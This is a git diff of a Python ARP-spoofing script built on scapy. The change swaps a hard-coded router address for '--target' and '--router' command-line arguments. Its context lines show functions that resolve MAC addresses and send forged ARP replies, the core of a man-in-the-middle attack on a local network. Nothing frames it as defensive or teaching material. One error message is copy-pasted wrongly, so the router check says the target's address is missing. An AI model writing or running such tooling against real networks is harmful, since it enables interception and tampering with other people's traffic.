@@ -6,11 +6,14 @@ import argparse
 
 def get_ips():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--ip_address", dest="ip_address", help="[-] Target's ip-address")
+    parser.add_argument("-t", "--target", dest="target_ip", help="[-] Target's ip-address")
+    parser.add_argument("-r", "--router", dest="router_ip", help="[-] Router's ip-address")
     arg = parser.parse_args()
-    if not arg.ip_address:
+    if not arg.target_ip:
         parser.error("[-] Target's ip address required")
-    return arg.ip_address
+    if not arg.router_ip:
+        parser.error("[-] Target's ip address required")
+    return arg
 
 def get_mac_address(ip):
     arp_req = scapy.ARP(pdst=ip)
@@ -26,9 +29,9 @@ def spoof(target_ip, spoof_ip):
 def restore(dst_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=get_mac_address(dst_ip), psrc=src_ip, hwsrc=get_mac_address(src_ip))
     scapy.send(packet, count=4, verbose=False)
-
-target_ip = get_ips()
-router_ip = "10.0.2.1"
+args = get_ips()
+target_ip = args.target_ip
+router_ip = args.router_ip
 packets_amount = 0
 
 try:
